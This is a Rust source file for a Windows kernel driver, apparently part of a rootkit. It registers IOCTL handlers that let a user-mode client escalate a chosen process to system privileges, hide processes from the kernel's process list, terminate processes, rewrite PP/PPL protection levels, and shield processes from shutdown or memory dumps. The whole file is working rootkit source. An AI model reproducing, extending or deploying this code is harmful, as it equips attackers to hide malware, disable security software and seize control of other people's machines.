use {
    wdk_sys::*,
    alloc::{boxed::Box, string::ToString},
    core::sync::atomic::{AtomicPtr, Ordering},
    shadowx::{
        Process, error::ShadowError, 
        PROCESS_INFO_HIDE, 
    },
};

use {
    crate::utils::{
        ioctls::IoctlManager,
        get_input_buffer, 
        get_output_buffer
    },
    common::{
        ioctls::*,
        enums::Options,
        structs::TargetProcess
    },
};

/// Registers the IOCTL handlers for process-related operations.
/// 
/// This function registers various IOCTL handlers for managing process-related operations,
/// such as elevating privileges, hiding/unhiding processes, terminating processes, modifying 
/// process protection, and enumerating hidden processes. These handlers are mapped to specific 
/// IOCTL codes and provide functionality based on the type of operation requested by the user.
/// 
/// The following IOCTL operations are supported:
/// 
/// * **ELEVATE_PROCESS** - Elevates the privileges of the specified process to system privileges.
/// * **HIDE_UNHIDE_PROCESS** - Hides or unhides a specified process, depending on the input.
/// * **TERMINATE_PROCESS** - Terminates the specified process.
/// * **SIGNATURE_PROCESS** - Modifies the protection signature (PP/PPL) of a process.
/// * **ENUMERATION_PROCESS** - Lists processes that are currently hidden or protected.
/// 
/// # Arguments
/// 
/// * `ioctls` - A mutable reference to an `IoctlManager` where the process-related IOCTL handlers will be registered.
pub fn register_process_ioctls(ioctls: &mut IoctlManager) {
    // Elevates the privileges of a specific process.
    ioctls.register_handler(ELEVATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            // Retrieves the process information from the input buffer.
            let target_process = get_input_buffer::<TargetProcess>(stack)?;
            let pid = (*target_process).pid;

            // Update the IoStatus with the size of the process information.
            (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;

            // Elevates the process privileges.
            Process::elevate_process(pid)
        }
    }));

    // Hide or Unhide the specified process.
    ioctls.register_handler(HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            // Retrieves the process information from the input buffer.
            let target_process = get_input_buffer::<TargetProcess>(stack)?;
            let pid = (*target_process).pid;
            
            // Hide or unhide the process based on the 'enable' flag.
            let status = if (*target_process).enable {
                // Hides the process and stores its previous state.
                let previous_list = Process::hide_process(pid)?;
                let mut process_info = PROCESS_INFO_HIDE.lock();
                let list_ptr = Box::into_raw(Box::new(previous_list));

                process_info.push(TargetProcess {
                    pid,
                    list_entry: AtomicPtr::new(list_ptr as *mut _),
                    ..Default::default()
                });

                STATUS_SUCCESS
            } else {
                // Unhides the process.
                let list_entry = PROCESS_INFO_HIDE.lock()
                    .iter()
                    .find(|p| p.pid == pid)
                    .map(|process| process.list_entry.load(Ordering::SeqCst))
                    .ok_or(ShadowError::ProcessNotFound(pid.to_string()))?;

                Process::unhide_process(pid, list_entry as *mut _)?
            };

            // Updates the IoStatus and returns the result of the operation.
            (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;
            Ok(status)
        }
    }));

    // Terminates the specified process.
    ioctls.register_handler(TERMINATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            // Retrieves the process information from the input buffer.
            let target_process = get_input_buffer::<TargetProcess>(stack)?;
            let pid = (*target_process).pid;

            // Update the IoStatus with the size of the process information.
            (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;

            // Terminates the process.
            Process::terminate_process(pid)
        }
    }));

    // Modifies the PP/PPL (Protection Signature) of a process.
    ioctls.register_handler(SIGNATURE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            // Retrieves the process information from the input buffer.
            let target_process = get_input_buffer::<TargetProcess>(stack)?;
            let pid = (*target_process).pid;
            let sg = (*target_process).sg;
            let tp = (*target_process).tp;

            // Updates the IoStatus with the size of the process information.
            (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;

            // Modify the process's protection signature.
            Process::protection_signature(pid, sg, tp)
        }
    }));

    // Lists hidden and protected processes.
    ioctls.register_handler(ENUMERATION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            // Retrieves the output buffer to store process information.
            let output_buffer = get_output_buffer::<TargetProcess>(irp)?;
            let input_target = get_input_buffer::<TargetProcess>(stack)?;

            // Based on the options, either enumerate hidden or protected processes.
            let processes = match (*input_target).options {
                Options::Hide => Process::enumerate_hide_processes(),
                #[cfg(not(feature = "mapper"))]
                Options::Protection => shadowx::ProcessCallback::enumerate_protection_processes(),
                #[cfg(feature = "mapper")]
                _ => alloc::vec::Vec::new(),
            };

            // Fill the output buffer with the enumerated processes' information.
            for (index, process) in processes.iter().enumerate() {
                let info_ptr = output_buffer.add(index);
                (*info_ptr).pid = process.pid;
            }

            // Updates the IoStatus with the size of the enumerated processes.
            (*irp).IoStatus.Information = (processes.len() * size_of::<TargetProcess>()) as u64;
            Ok(STATUS_SUCCESS)
        }
    }));

    // If the `mapper` feature is not enabled, register protection handlers.
    #[cfg(not(feature = "mapper"))] {
        // Add or remove shutdown/memory dump protection for a process.
        ioctls.register_handler(PROTECTION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                // Retrieves the process information from the input buffer.
                let process_protection = get_input_buffer::<TargetProcess>(stack)?;
                let pid = (*process_protection).pid;
                let enable = (*process_protection).enable;

                // Adds or removes protection for the process based on the 'enable' flag.
                let status = if enable {
                    shadowx::ProcessCallback::add_target_pid(pid)
                } else {
                    shadowx::ProcessCallback::remove_target_pid(pid)
                };

                // Updates the IoStatus with the size of the process information.
                (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;
                Ok(status)
            }
        }));
    }
}
